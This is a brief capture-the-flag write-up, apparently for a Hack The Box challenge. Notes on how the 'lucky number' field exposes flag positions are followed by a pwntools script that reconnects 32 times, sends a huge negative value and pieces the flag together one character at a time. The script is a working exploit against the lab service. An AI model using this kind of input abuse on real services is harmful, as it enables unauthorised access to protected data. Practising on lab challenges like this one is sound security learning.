""""We figured out that when we put 0 on the lucky number we always got H in the first postion.
We then checked that with lucky number equal to 1 gived us T on the second position always...
With few coins it worked for the first letters but it started failing. We added more zeros and it worked...
We got the flag with the next script:"""

from pwn import *
flag = ""

for i in range(32):
    con = remote("docker.hackthebox.eu",30599)
    con.recvuntil(b"Exit.\n")
    con.send(b"1\n")
    con.recvuntil(b"(1-32): ")
    con.send(str(i) + "\n")
    con.recvuntil(b"Exit.\n")
    con.send(b"2\n")
    con.send(b"-1000000000000000000000000000000000000\n")
    con.recvuntil(b"Exit.\n")
    con.send(b"3\n")
    con.readline()
    con.readline()
    con.readline()
    x = con.recvall()
    print(x)
    flag += chr(x[i])
    print(flag)
    con.close()
print(flag)
